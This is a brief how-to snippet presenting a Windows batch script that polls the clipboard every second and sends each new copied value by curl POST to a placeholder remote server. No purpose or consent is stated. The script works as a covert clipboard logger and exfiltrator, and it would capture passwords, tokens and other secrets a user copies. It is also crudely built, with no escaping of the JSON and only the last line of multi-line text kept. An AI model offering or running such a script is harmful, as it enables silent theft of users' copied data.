# Sending over HTTP using bat script

```cmd
@echo off
set "serverUrl=https://host.com"

:loop
rem Store clipboard content in a temporary file
powershell Get-Clipboard > clipboard.txt

rem Read clipboard content and compare with the last value
for /f "delims=" %%A in (clipboard.txt) do set "newText=%%A"
if not defined newText goto loop
if "%newText%"=="%lastText%" goto loop

rem Update last copied text
set "lastText=%newText%"

rem Send POST request using curl
curl -X POST -H "Content-Type: application/json" -d "{\"text\":\"%newText%\"}" %serverUrl%

rem Wait and loop again
timeout /t 1 /nobreak >nul
goto loop
```
